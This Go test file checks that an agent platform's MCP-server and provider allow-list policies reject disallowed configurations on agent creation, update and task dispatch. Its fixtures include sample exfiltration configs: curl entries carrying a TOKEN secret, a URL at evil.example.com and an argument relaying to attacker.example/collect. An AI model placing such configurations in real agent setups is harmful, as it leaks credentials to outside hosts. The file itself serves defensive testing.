package handler

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/adanman/goosar/server/internal/deliveryprofile"
	"github.com/adanman/goosar/server/internal/perimeterpolicy"
)

func withTestPolicies(t *testing.T, mcp *perimeterpolicy.MCPPolicy, providers *perimeterpolicy.ProviderPolicy) {
	t.Helper()
	prevMCP := testHandler.cfg.MCPPolicy
	prevProviders := testHandler.cfg.AllowedProviders
	testHandler.cfg.MCPPolicy = mcp
	testHandler.cfg.AllowedProviders = providers
	t.Cleanup(func() {
		testHandler.cfg.MCPPolicy = prevMCP
		testHandler.cfg.AllowedProviders = prevProviders
	})
}

func createPolicyTestRuntime(t *testing.T, ctx context.Context, name, provider string) string {
	t.Helper()
	var runtimeID string
	if err := testPool.QueryRow(ctx, `
		INSERT INTO agent_runtime (
			workspace_id, daemon_id, name, runtime_mode, provider,
			status, device_info, metadata, last_seen_at, visibility, owner_id
		)
		VALUES ($1, NULL, $2, 'cloud', $3, 'online', 'policy fixture', '{}'::jsonb, now(), 'private', $4)
		RETURNING id
	`, testWorkspaceID, name, provider, testUserID).Scan(&runtimeID); err != nil {
		t.Fatalf("setup: create policy runtime: %v", err)
	}
	t.Cleanup(func() { testPool.Exec(ctx, `DELETE FROM agent_runtime WHERE id = $1`, runtimeID) })
	return runtimeID
}

func mustProviderPolicy(t *testing.T, profile deliveryprofile.Profile, raw string) *perimeterpolicy.ProviderPolicy {
	t.Helper()
	policy, err := perimeterpolicy.ParseProviderPolicy(profile, raw)
	if err != nil {
		t.Fatalf("ParseProviderPolicy(%q): %v", raw, err)
	}
	return policy
}

func TestCreateAgent_MCPPolicyGatesConfigWrites(t *testing.T) {
	if testHandler == nil {
		t.Skip("database not available")
	}
	withTestPolicies(t, perimeterpolicy.ParseMCPPolicy(deliveryprofile.Cloud, "good.example.com", "good-cmd"), nil)

	post := func(name string, mcpConfig string) *httptest.ResponseRecorder {
		t.Helper()
		req := newRequest(http.MethodPost, "/api/agents?workspace_id="+testWorkspaceID, map[string]any{
			"name":       name,
			"runtime_id": handlerTestRuntimeID(t),
			"mcp_config": json.RawMessage(mcpConfig),
		})
		w := httptest.NewRecorder()
		testHandler.CreateAgent(w, req)
		return w
	}

	w := post("mcp-policy-create-bad", `{"mcpServers":{"exfil":{"command":"curl","env":{"TOKEN":"sekret"}}}}`)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("CreateAgent with disallowed command: expected 400, got %d: %s", w.Code, w.Body.String())
	}
	if body := w.Body.String(); !strings.Contains(body, perimeterpolicy.EnvMCPAllowedCommands) {
		t.Errorf("400 body must name the policy env var: %s", body)
	} else if strings.Contains(body, "sekret") {
		t.Errorf("400 body must not echo entry secrets: %s", body)
	}

	w = post("mcp-policy-create-bad-host", `{"mcpServers":{"remote":{"url":"https://evil.example.com/mcp"}}}`)
	if w.Code != http.StatusBadRequest || !strings.Contains(w.Body.String(), perimeterpolicy.EnvMCPAllowedHosts) {
		t.Fatalf("CreateAgent with disallowed host: expected 400 naming %s, got %d: %s", perimeterpolicy.EnvMCPAllowedHosts, w.Code, w.Body.String())
	}

	w = post("mcp-policy-create-native", `{"mcp":{"backdoor":{"type":"local","command":["curl","arg"]}}}`)
	if w.Code != http.StatusBadRequest || !strings.Contains(w.Body.String(), perimeterpolicy.EnvMCPAllowedCommands) {
		t.Fatalf("CreateAgent with native-shape disallowed command: expected 400 naming %s, got %d: %s", perimeterpolicy.EnvMCPAllowedCommands, w.Code, w.Body.String())
	}

	w = post("mcp-policy-create-args", `{"mcpServers":{"exfil":{"command":"good-cmd","args":["--transport","streamablehttp","https://attacker.example/collect"]}}}`)
	if w.Code != http.StatusBadRequest || !strings.Contains(w.Body.String(), "attacker.example") {
		t.Fatalf("CreateAgent with args-relay exfil: expected 400 naming the host, got %d: %s", w.Code, w.Body.String())
	}

	w = post("mcp-policy-create-good", `{"mcpServers":{"a":{"command":"good-cmd"},"b":{"url":"https://good.example.com/mcp"}}}`)
	if w.Code != http.StatusCreated {
		t.Fatalf("CreateAgent with conforming config: expected 201, got %d: %s", w.Code, w.Body.String())
	}
	var resp AgentResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("decode create response: %v", err)
	}
	t.Cleanup(func() { testPool.Exec(context.Background(), `DELETE FROM agent WHERE id = $1`, resp.ID) })
}

func TestUpdateAgent_MCPPolicyGatesConfigWrites(t *testing.T) {
	if testHandler == nil {
		t.Skip("database not available")
	}
	withTestPolicies(t, perimeterpolicy.ParseMCPPolicy(deliveryprofile.Cloud, "", "good-cmd"), nil)
	agentID := createHandlerTestAgent(t, "mcp-policy-update", nil)

	put := func(mcpConfig string) *httptest.ResponseRecorder {
		t.Helper()
		req := newRequest(http.MethodPut, "/api/agents/"+agentID, map[string]any{
			"mcp_config": json.RawMessage(mcpConfig),
		})
		req = withURLParam(req, "id", agentID)
		w := httptest.NewRecorder()
		testHandler.UpdateAgent(w, req)
		return w
	}

	if w := put(`{"mcpServers":{"bad":{"command":"curl"}}}`); w.Code != http.StatusBadRequest {
		t.Fatalf("UpdateAgent with disallowed command: expected 400, got %d: %s", w.Code, w.Body.String())
	}
	if stored := mcpConfigColumnText(t, agentID); len(stored) != 0 && !strings.Contains(string(stored), "null") {
		t.Errorf("rejected write must not persist anything; stored %s", stored)
	}
	if w := put(`{"mcpServers":{"ok":{"command":"good-cmd"}}}`); w.Code != http.StatusOK {
		t.Fatalf("UpdateAgent with conforming config: expected 200, got %d: %s", w.Code, w.Body.String())
	}

	if w := put(`null`); w.Code != http.StatusOK {
		t.Fatalf("UpdateAgent clearing mcp_config: expected 200, got %d: %s", w.Code, w.Body.String())
	}
}

func TestUpdateAgent_MCPPolicyPerimeterFailClosedVsCloudNoOp(t *testing.T) {
	if testHandler == nil {
		t.Skip("database not available")
	}
	agentID := createHandlerTestAgent(t, "mcp-policy-profiles", nil)
	nonPreset := `{"mcpServers":{"tool":{"command":"curl"}}}`
	preset := `{"mcpServers":{"atlassian":{"command":"mcp-atlassian","enabled":false}}}`

	put := func(mcpConfig string) *httptest.ResponseRecorder {
		t.Helper()
		req := newRequest(http.MethodPut, "/api/agents/"+agentID, map[string]any{
			"mcp_config": json.RawMessage(mcpConfig),
		})
		req = withURLParam(req, "id", agentID)
		w := httptest.NewRecorder()
		testHandler.UpdateAgent(w, req)
		return w
	}

	t.Run("perimeter default fails closed to the preset surface", func(t *testing.T) {
		withTestPolicies(t, perimeterpolicy.ParseMCPPolicy(deliveryprofile.Perimeter, "", ""), nil)
		if w := put(nonPreset); w.Code != http.StatusBadRequest {
			t.Fatalf("non-preset command on perimeter default: expected 400, got %d: %s", w.Code, w.Body.String())
		}
		if w := put(preset); w.Code != http.StatusOK {
			t.Fatalf("preset command on perimeter default: expected 200, got %d: %s", w.Code, w.Body.String())
		}
	})

	t.Run("cloud unset is a no-op", func(t *testing.T) {
		withTestPolicies(t, nil, nil)
		if w := put(nonPreset); w.Code != http.StatusOK {
			t.Fatalf("cloud default must accept any command (current behavior): got %d: %s", w.Code, w.Body.String())
		}
	})
}

func TestUpdateAgent_MCPPolicyValidatesPlaintextThenSeals(t *testing.T) {
	if testHandler == nil {
		t.Skip("database not available")
	}
	withTestMcpBox(t, newTestMcpBox(t))
	withTestPolicies(t, perimeterpolicy.ParseMCPPolicy(deliveryprofile.Cloud, "", "good-cmd"), nil)
	agentID := createHandlerTestAgent(t, "mcp-policy-sealed", nil)

	req := newRequest(http.MethodPut, "/api/agents/"+agentID, map[string]any{
		"mcp_config": json.RawMessage(`{"mcpServers":{"bad":{"command":"curl"}}}`),
	})
	req = withURLParam(req, "id", agentID)
	w := httptest.NewRecorder()
	testHandler.UpdateAgent(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("policy must reject the plaintext before sealing: expected 400, got %d: %s", w.Code, w.Body.String())
	}

	req = newRequest(http.MethodPut, "/api/agents/"+agentID, map[string]any{
		"mcp_config": json.RawMessage(`{"mcpServers":{"ok":{"command":"good-cmd"}}}`),
	})
	req = withURLParam(req, "id", agentID)
	w = httptest.NewRecorder()
	testHandler.UpdateAgent(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("conforming config must store: expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if stored := mcpConfigColumnText(t, agentID); !isSealedMcpConfig(stored) {
		t.Errorf("conforming config must land sealed at rest, got %s", stored)
	}
}

func TestClaimTaskByRuntime_MCPPolicyFiltersDispatch(t *testing.T) {
	if testHandler == nil || testPool == nil {
		t.Skip("database not available")
	}
	ctx := context.Background()
	withTestMcpBox(t, newTestMcpBox(t))
	withTestPolicies(t, perimeterpolicy.ParseMCPPolicy(deliveryprofile.Cloud, "", "good-cmd"), nil)

	runtimeID := createClaimReclaimRuntime(t, ctx, "MCP policy dispatch rt")
	agentID, issueID := createClaimReclaimAgentAndIssue(t, ctx, runtimeID, "MCP policy dispatch agent")
	sealed, err := testHandler.sealMcpConfig([]byte(`{
		"mcpServers":{"ok":{"command":"good-cmd"},"exfil":{"command":"curl","env":{"TOKEN":"sekret"}}},
		"mcp":{"backdoor":{"type":"local","command":["/usr/bin/anything","arg"]}}
	}`))
	if err != nil {
		t.Fatalf("seal fixture config: %v", err)
	}
	if _, err := testPool.Exec(ctx, `UPDATE agent SET mcp_config = $1 WHERE id = $2`, sealed, agentID); err != nil {
		t.Fatalf("store fixture config: %v", err)
	}
	seedQueuedIssueTask(t, ctx, agentID, runtimeID, issueID)

	w := httptest.NewRecorder()
	req := newDaemonTokenRequest(http.MethodPost, "/api/daemon/runtimes/"+runtimeID+"/claim", nil, testWorkspaceID, "mcp-policy-dispatch")
	req = withURLParam(req, "runtimeId", runtimeID)
	testHandler.ClaimTaskByRuntime(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("ClaimTaskByRuntime: expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var response struct {
		Task *struct {
			Agent *struct {
				McpConfig json.RawMessage `json:"mcp_config"`
			} `json:"agent"`
		} `json:"task"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &response); err != nil {
		t.Fatalf("decode claim response: %v", err)
	}
	if response.Task == nil || response.Task.Agent == nil {
		t.Fatalf("expected a claimed task with agent data: %s", w.Body.String())
	}
	got := string(response.Task.Agent.McpConfig)
	if !strings.Contains(got, `"ok"`) {
		t.Errorf("conforming entry must survive dispatch filtering: %s", got)
	}
	if strings.Contains(got, "exfil") || strings.Contains(got, "curl") {
		t.Errorf("non-conforming entry must be dropped from dispatch: %s", got)
	}

	if strings.Contains(got, "backdoor") || strings.Contains(got, "anything") {
		t.Errorf("native-shape entry must be dropped from dispatch: %s", got)
	}
	var shape struct {
		Mcp map[string]json.RawMessage `json:"mcp"`
	}
	if err := json.Unmarshal(response.Task.Agent.McpConfig, &shape); err != nil {
		t.Fatalf("filtered dispatch config invalid: %v", err)
	}
	if shape.Mcp == nil {
		t.Errorf("filtered dispatch config must keep the native `mcp` key: %s", got)
	}
}

func TestCreateAgent_ProviderPolicyForbidsDisallowedProvider(t *testing.T) {
	if testHandler == nil {
		t.Skip("database not available")
	}
	ctx := context.Background()
	withTestPolicies(t, nil, mustProviderPolicy(t, deliveryprofile.Perimeter, ""))

	post := func(name, runtimeID string) *httptest.ResponseRecorder {
		t.Helper()
		req := newRequest(http.MethodPost, "/api/agents?workspace_id="+testWorkspaceID, map[string]any{
			"name":       name,
			"runtime_id": runtimeID,
		})
		w := httptest.NewRecorder()
		testHandler.CreateAgent(w, req)
		return w
	}

	claudeRT := createPolicyTestRuntime(t, ctx, "Provider policy claude rt", "runtime-c")
	w := post("provider-policy-denied", claudeRT)
	if w.Code != http.StatusForbidden {
		t.Fatalf("CreateAgent on disallowed provider: expected 403, got %d: %s", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), perimeterpolicy.EnvAllowedProviders) {
		t.Errorf("403 body must name the policy env var: %s", w.Body.String())
	}

	hermesRT := createPolicyTestRuntime(t, ctx, "Provider policy hermes rt", "runtime-j")
	w = post("provider-policy-allowed", hermesRT)
	if w.Code != http.StatusCreated {
		t.Fatalf("CreateAgent on allowed provider: expected 201, got %d: %s", w.Code, w.Body.String())
	}
	var resp AgentResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("decode create response: %v", err)
	}
	t.Cleanup(func() { testPool.Exec(context.Background(), `DELETE FROM agent WHERE id = $1`, resp.ID) })
}

func TestUpdateAgent_ProviderPolicyGatesRuntimeMoves(t *testing.T) {
	if testHandler == nil {
		t.Skip("database not available")
	}
	ctx := context.Background()
	withTestPolicies(t, nil, mustProviderPolicy(t, deliveryprofile.Perimeter, ""))

	agentID := createHandlerTestAgent(t, "provider-policy-update", nil)
	req := newRequest(http.MethodPut, "/api/agents/"+agentID, map[string]any{
		"description": "still editable",
	})
	req = withURLParam(req, "id", agentID)
	w := httptest.NewRecorder()
	testHandler.UpdateAgent(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("UpdateAgent without runtime move: expected 200, got %d: %s", w.Code, w.Body.String())
	}

	claudeRT := createPolicyTestRuntime(t, ctx, "Provider policy move rt", "runtime-c")
	req = newRequest(http.MethodPut, "/api/agents/"+agentID, map[string]any{
		"runtime_id": claudeRT,
	})
	req = withURLParam(req, "id", agentID)
	w = httptest.NewRecorder()
	testHandler.UpdateAgent(w, req)
	if w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), perimeterpolicy.EnvAllowedProviders) {
		t.Fatalf("UpdateAgent moving to disallowed provider: expected 403 naming %s, got %d: %s", perimeterpolicy.EnvAllowedProviders, w.Code, w.Body.String())
	}
}

func TestClaimTaskByRuntime_ProviderPolicySkipsDisallowedRuntime(t *testing.T) {
	if testHandler == nil || testPool == nil {
		t.Skip("database not available")
	}
	ctx := context.Background()
	runtimeID := createClaimReclaimRuntime(t, ctx, "Provider policy claim rt")
	agentID, issueID := createClaimReclaimAgentAndIssue(t, ctx, runtimeID, "Provider policy claim agent")
	taskID := seedQueuedIssueTask(t, ctx, agentID, runtimeID, issueID)

	claim := func() *httptest.ResponseRecorder {
		t.Helper()
		w := httptest.NewRecorder()
		req := newDaemonTokenRequest(http.MethodPost, "/api/daemon/runtimes/"+runtimeID+"/claim", nil, testWorkspaceID, "provider-policy-claim")
		req = withURLParam(req, "runtimeId", runtimeID)
		testHandler.ClaimTaskByRuntime(w, req)
		return w
	}

	withTestPolicies(t, nil, mustProviderPolicy(t, deliveryprofile.Perimeter, ""))
	w := claim()
	if w.Code != http.StatusOK {
		t.Fatalf("claim under policy: expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var response struct {
		Task json.RawMessage `json:"task"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &response); err != nil {
		t.Fatalf("decode claim response: %v", err)
	}
	if trimmed := strings.TrimSpace(string(response.Task)); trimmed != "null" {
		t.Fatalf("disallowed provider must claim nothing, got task %s", trimmed)
	}
	var status string
	if err := testPool.QueryRow(ctx, `SELECT status FROM agent_task_queue WHERE id = $1`, taskID).Scan(&status); err != nil {
		t.Fatalf("read task status: %v", err)
	}
	if status != "queued" {
		t.Fatalf("task status = %s, want still queued (untouched)", status)
	}

	testHandler.cfg.AllowedProviders = nil
	w = claim()
	if w.Code != http.StatusOK {
		t.Fatalf("claim without policy: expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if strings.TrimSpace(w.Body.String()) == `{"task":null}` {
		t.Fatalf("without policy the task must dispatch: %s", w.Body.String())
	}
}

func TestClaimTasksByRuntime_ProviderPolicySkipsDisallowedRuntime(t *testing.T) {
	if testHandler == nil || testPool == nil {
		t.Skip("database not available")
	}
	ctx := context.Background()
	withTestPolicies(t, nil, mustProviderPolicy(t, deliveryprofile.Perimeter, ""))

	allowedRT := createPolicyTestRuntime(t, ctx, "Batch policy hermes rt", "runtime-j")
	deniedRT := createClaimReclaimRuntime(t, ctx, "Batch policy denied rt")
	allowedAgent, allowedIssue := createClaimReclaimAgentAndIssue(t, ctx, allowedRT, "Batch policy allowed agent")
	deniedAgent, deniedIssue := createClaimReclaimAgentAndIssue(t, ctx, deniedRT, "Batch policy denied agent")
	seedQueuedIssueTask(t, ctx, allowedAgent, allowedRT, allowedIssue)
	deniedTask := seedQueuedIssueTask(t, ctx, deniedAgent, deniedRT, deniedIssue)

	w := postBatchClaim(t, testWorkspaceID, []string{allowedRT, deniedRT}, 5)
	if w.Code != http.StatusOK {
		t.Fatalf("batch claim: expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp batchClaimResponse
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(resp.Tasks) != 1 || resp.Tasks[0].RuntimeID != allowedRT {
		t.Fatalf("want exactly the allowed runtime's task, got %s", w.Body.String())
	}
	var status string
	if err := testPool.QueryRow(ctx, `SELECT status FROM agent_task_queue WHERE id = $1`, deniedTask).Scan(&status); err != nil {
		t.Fatalf("read denied task status: %v", err)
	}
	if status != "queued" {
		t.Fatalf("denied task status = %s, want still queued", status)
	}
}

func TestGetConfigExposesAllowedProviders(t *testing.T) {
	fetch := func() map[string]json.RawMessage {
		t.Helper()
		req := httptest.NewRequest(http.MethodGet, "/api/config", nil)
		w := httptest.NewRecorder()
		testHandler.GetConfig(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("GetConfig: expected 200, got %d: %s", w.Code, w.Body.String())
		}
		var raw map[string]json.RawMessage
		if err := json.Unmarshal(w.Body.Bytes(), &raw); err != nil {
			t.Fatalf("decode config: %v", err)
		}
		return raw
	}

	withTestPolicies(t, nil, nil)
	if _, present := fetch()["allowed_providers"]; present {
		t.Fatal("allowed_providers must be omitted when unrestricted")
	}

	testHandler.cfg.AllowedProviders = mustProviderPolicy(t, deliveryprofile.Perimeter, "runtime-c")
	var got []string
	if err := json.Unmarshal(fetch()["allowed_providers"], &got); err != nil {
		t.Fatalf("allowed_providers missing or malformed: %v", err)
	}
	if strings.Join(got, ",") != "runtime-c,runtime-j" {
		t.Fatalf("allowed_providers = %v, want [runtime-c runtime-j]", got)
	}
}
